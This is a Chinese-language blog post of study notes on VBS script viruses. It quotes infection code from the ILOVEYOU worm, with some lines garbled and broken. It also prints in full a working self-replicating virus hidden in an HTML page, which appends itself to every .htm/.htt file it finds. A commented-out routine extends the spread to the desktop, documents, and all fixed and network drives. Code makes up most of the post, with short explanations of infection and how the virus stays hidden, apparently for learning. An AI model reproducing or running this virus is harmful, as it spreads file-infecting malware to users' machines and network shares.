---
layout: post
title: Vbs脚本病毒
subtitle: Vbs脚本病毒的介绍以及学习笔记
categories: markdown
tags: [Vbs virus]
---





# Vbs脚本病毒学习笔记（1）

## 1.Vbs脚本病毒的特点以及发展现状

​        VBS病毒是用VB Script编写而成，该脚本语言功能非常强大，它们利用Windows系统的开放性特点，通过调用一些现成的Windows对象、组件，可以直接对文件系统、注册表等进行控制，功能非常强大。应该说病毒就是一种思想，但是这种思想在用VBS实现时变得极其容易。VBS脚本病毒具有如下几个特点：

1.**编写简单**，初学者也能很快学习并且编写出一个简易的Vbs脚本病毒。

2.**破坏力大**，脚本病毒不仅仅会破坏用户系统文件，还可以使得邮件服务器崩溃，网络发生阻塞。

3.**较强的感染能力**，由于是脚本直接解释执行，因此可以直接通过自我复制的方式感染其他的同类文件。

4.**传播范围较大**，通过htm文档，Email附件等，可以较短时间内大量传播。

5.**欺骗性较强**，脚本病毒为了得到运行的机会，往往会采用各种让用户不大注意的手段，例如在某个附件名后面采用双后缀，比如Beauty.jpg.vbs。由于系统默认不会显示后缀，用户就会以为它是一个JPG格式的图片文件。

6.**病毒生产机实现起来非常容易**。所谓病毒生产机，就是可以按照用户的意愿，生产病毒的机器（当然，这里指的是程序），目前的病毒生产机，之所以大多数都为脚本病毒生产机，其中最重要的一点还是因为脚本是解释执行的，实现起来非常容易。

## 2.Vbs脚本病毒的原理分析

​        VBS脚本病毒一般是直接通过自我复制来感染文件的。病毒中的绝大部分代码都可以直接附加在其他同类程序的中间，如爱虫病毒则是直接生成一个文件的副本，将病毒代码拷入其中，并以原文件名作为病毒文件名的前缀，vbs作为后缀。下面我们通过爱虫病毒的部分代码具体分析一下这类病毒的感染和搜索原理：

```vbscript
Set fso=createobject("scripting.filesystemobject")  '创建一个文件系统对象
　　set self=fso.opentextfile(wscript.scriptfullname,1) '读打开当前文件（即病毒本身）
　　vbscopy=self.readall　　  ' 读取病毒全部代码到字符串变量vbscopy…… 
　　set ap=fso.opentextfile(目标文件.path,2,true) ' 写打开目标文件，准备写入病毒代码
　　ap.write vbscopy　　　　　　  ' 将病毒代码覆盖目标文件
　　ap.close
　　set cop=fso.getfile(目标文件.path)   '得到目标文件路径
　　cop.copy(目标文件.path & ".vbs")　  ' 创建另外一个病毒文件（以.vbs为后缀）
　　目标文件.delete(true)　　　'删除目标文件
```

​        **我们可以看到Vbs病毒感染正常文件的方式：通过将自身的代码赋给字符串变量，将字符串覆盖写到目标文件，并且创建一个以目标文件名为前缀，vbs为后缀的文件副本，最后将原来的目标文件删除。**接着我们继续分析Vbs如何进行文件搜索的：

```vbscript
sub scan(folder_)　　'scan函数定义，
　　on error resume next　　 '如果出现错误，直接跳过，防止弹出错误窗口
　　set folder_=fso.getfolder(folder_)
　　　　 set files=folder_.files　　  ' 当前目录的所有文件集合
　　　　 for each file in filesext=fso.GetExtensionName(file)　　'获取文件后缀
　　　　 ext=lcase(ext)　　　  '后缀名转换成小写字母
　　　　　if ext="mp5" then　　'如果后缀名是mp5，则进行感染。请自己建立相应后缀名的文件，最好是非正常后缀名 ，以免破坏正常程序。
　　　　Wscript.echo (file)
　　　end if
　　next
　　set subfolders=folder_.subfolders
　　for each subfolder in subfolders　　'搜索其他目录；递归调用
　　　scan( ) 
　　　scan(subfolder)
　　next
　　end sub
```

​         Vbs脚本病毒对于文件搜索的方式非常巧妙，通过递归的方式对整个大目录都完整地进行了一次便利，**并且搜索的文件也有一定的窍门：寻找非正常的后缀避免感染后破坏正常程序，导致病毒不再隐蔽。与此同时也保证了错误处理——错误直接跳过防止弹出报错窗口导致病毒暴露。一切的一切都是为了病毒传播的隐蔽性服务。**

## 3.Vbs病毒示例原理分析

```vbscript
<html>
	<head>
		<title>hello</title>
	</head>
	<body>
		hello，本文件寄生了一个大概需要xp中的ie才能运行的vbs病毒传播演示
	</body>
</html>

<!-- TimeStamp 12:30 A 不要改动这一行 -->

<script language="vbscript">

Set Window.Onload = GetRef("autohook")   ' 设置钩子

Const ForReading=1, ForWriting=2, ForAppending=8
Dim mignature   ' magic signature, 使用&以避免查找时混淆
    mignature = "TimeStamp " & "12:30"
Dim fso         '
Set fso = CreateObject("Scripting.FileSystemObject")
Dim sh          '
Set sh = CreateObject("WScript.Shell")
Dim mytext      ' mytext存放自己的代码，即从12:30开始的代码

Function autohook()
    getmytext()         ' 取得自己的代码文本
    if len(mytext) < 80 then
        msgbox mytext
        exit function   ' mytext的长度不大对头，算了
    end if
    StartSearchHTM()    ' 找html文件来传播
    'msgbox "hello"     ' 也可以做其他的事务
End Function

' 开始遍历各个目录和驱动器
Function StartSearchHTM()    ' 在指定的目录里找目标文件(html的)
    TravelDir("c:\30")       ' 这是个测试目录
    'StartSearchHTM_more()   ' ! 不要放开该行, 因为它要搜索整个硬盘
End Function
'
Function StartSearchHTM_more()   ' 更狠的
    TravelDir(sh.SpecialFolders("Desktop"))     ' 先在桌面上找找看
    TravelDir(sh.SpecialFolders("MyDocuments")) ' 再在文档夹里找
    'TravelDir(sh.SpecialFolders("Recent"))     ' 在你的最近使用的文件中找
    TravelDir(sh.SpecialFolders("Programs") & "\Common Files\Microsoft Shared\Stationery")
                                                ' 信纸模板
    dim dc, drv          '
    set dc = fso.Drives  ' drivers collect
    for each drv in dc
        if drv.DriveType=2 or drv.DriveType=3 then ' type: fixed, network
            TravelDir(drv)
        end if
    next
End Function

' 在该目录中找html文件
Function TravelDir(folderspec)  ' 目录的名字
    if not (fso.FileExists(folderspec) or fso.FolderExists(folderspec)) then
        exit function           ' not exist, so return
    end if
    Dim fld
    Set fld = fso.GetFolder(folderspec)
    dim f1, fc
    Set fc = fld.Files   ' 文件集合
    For Each f1 in fc    'for all files
        dim s
        s = f1.name
        if instr(s, ".htm") or instr(s, ".htt") then    ' 只要html文件
            AppendCode(f1.path)
        end if
    Next
    Dim fld1, fldc
    Set fldc = fld.SubFolders ' 子目录集合
    For Each fld1 in fldc     ' for all sub folders
        TravelDir(fld1.path)  ' 递归地查找
    Next
End Function

' 尝试在该html文件的尾部拼加自己的代码
Function AppendCode(filespec)
    dim f1 ' 访问其文件属性
    set f1 = fso.GetFile(filespec)
    if f1.Size>0 and f1.attributes=32 then ' 只关心长度非0的正常归档文件
        dim itstext ' 目标文本
        itstext = fso.OpenTextFile(filespec, ForReading).readall
        if instrrev(itstext, mignature & " B") = 0 then ' 还没感染
            dim file1
            set file1 = fso.OpenTextFile(filespec, ForAppending)
            file1.Write vbcrlf & vbcrlf & mytext & vbcrlf & vbcrlf ' 拼加之
            file1.Close
        end if
    end if
End Function

Function getmytext()
    dim myname ' 自己所在的文件的名字
    myname = LCase(Location.Href)
    if strcomp(left(myname, 8), "file:///") <> 0 then ' 不在本地文件系统里
        mytext = "not in local file system"
        exit function
    end if
    myname = right(myname, len(myname)-8)   ' 去掉"file:///"
    dim fulltext  ' 全文
    fulltext = fso.OpenTextFile(myname, ForReading).ReadAll ' 读入整个文件内容

    mytext =  "a-bug"    ' 如果没找到自己的位置的默认值（?!）
    dim posB, posA       ' 找特征串的开始和结束的位置
    posB = instrrev(fulltext, mignature & " B")
    if posB>0 then       ' 找到12:30～B标志
        posB = posB+len(mignature)+2+4' 修正
        posA = instrrev(fulltext, mignature & " A")
        if posA>0 then   ' 找到12:30～A标志
            posA = posA-5
            mytext = mid(fulltext, posA, posB-posA) ' 只取自己的A～B部分
        end if
    end if
End Function

</script>
<!-- 不要动这一行 TimeStamp 12:30 B -->
```

我们先对于其中的函数进行简要的分析，先看看第一部分文件搜索：

```vbscript
Function TravelDir(folderspec)  ' 目录的名字
    if not (fso.FileExists(folderspec) or fso.FolderExists(folderspec)) then
        exit function           ' not exist, so return
    end if
    Dim fld
    Set fld = fso.GetFolder(folderspec)
    dim f1, fc
    Set fc = fld.Files   ' 文件集合
    For Each f1 in fc    'for all files
        dim s
        s = f1.name
        if instr(s, ".htm") or instr(s, ".htt") then    ' 只要html文件
            AppendCode(f1.path)
        end if
    Next
    Dim fld1, fldc
    Set fldc = fld.SubFolders ' 子目录集合
    For Each fld1 in fldc     ' for all sub folders
        TravelDir(fld1.path)  ' 递归地查找
    Next
End Function
```

调用上述函数，进行进阶搜索操作的函数如下：

```vbscript
' 开始遍历各个目录和驱动器
Function StartSearchHTM()    ' 在指定的目录里找目标文件(html的)
    TravelDir("c:\30")       ' 这是个测试目录
    'StartSearchHTM_more()   ' ! 不要放开该行, 因为它要搜索整个硬盘
End Function
'
Function StartSearchHTM_more()   ' 更狠的
    TravelDir(sh.SpecialFolders("Desktop"))     ' 先在桌面上找找看
    TravelDir(sh.SpecialFolders("MyDocuments")) ' 再在文档夹里找
    'TravelDir(sh.SpecialFolders("Recent"))     ' 在你的最近使用的文件中找
    TravelDir(sh.SpecialFolders("Programs") & "\Common Files\Microsoft Shared\Stationery")
                                                ' 信纸模板
    dim dc, drv          '
    set dc = fso.Drives  ' drivers collect
    for each drv in dc
        if drv.DriveType=2 or drv.DriveType=3 then ' type: fixed, network
            TravelDir(drv)
        end if
    next
End Function
```

​        这一部分其实和我们前面的讲解代码很类似，都是先将当前文件的路径作为参数传入后，进行错误判断——如果路径不存在就直接跳出函数避免报错，否则脚本将会直接暴露。与此同时我们可以看到该脚本的目标是目录下的所有Htm或者Htt格式的非常见格式文件，在找到这样的文件后，脚本就会调用对应的Appendcode函数将需要插入的代码插入进Htm或者Htt文件中去。后面函数部分就通过自身的函数递归来不断查找子目录里所有符合该后缀格式要求的文件，并且不断插入代码，感染这些文件直至递归结束。基于这样的函数可以进行一些进阶的文件搜索工作。

再看看第二部分插入代码段的函数：

```vbscript
' 尝试在该html文件的尾部拼加自己的代码
Function AppendCode(filespec)
    dim f1 ' 访问其文件属性
    set f1 = fso.GetFile(filespec)
    if f1.Size>0 and f1.attributes=32 then ' 只关心长度非0的正常归档文件
        dim itstext ' 目标文本
        itstext = fso.OpenTextFile(filespec, ForReading).readall
        if instrrev(itstext, mignature & " B") = 0 then ' 还没感染
            dim file1
            set file1 = fso.OpenTextFile(filespec, ForAppending)
            file1.Write vbcrlf & vbcrlf & mytext & vbcrlf & vbcrlf ' 拼加之
            file1.Close
        end if
    end if
End Function
```

不过这段代码将原有代码段插入找到的文件后，并没有复制一个副本再删除源文件。



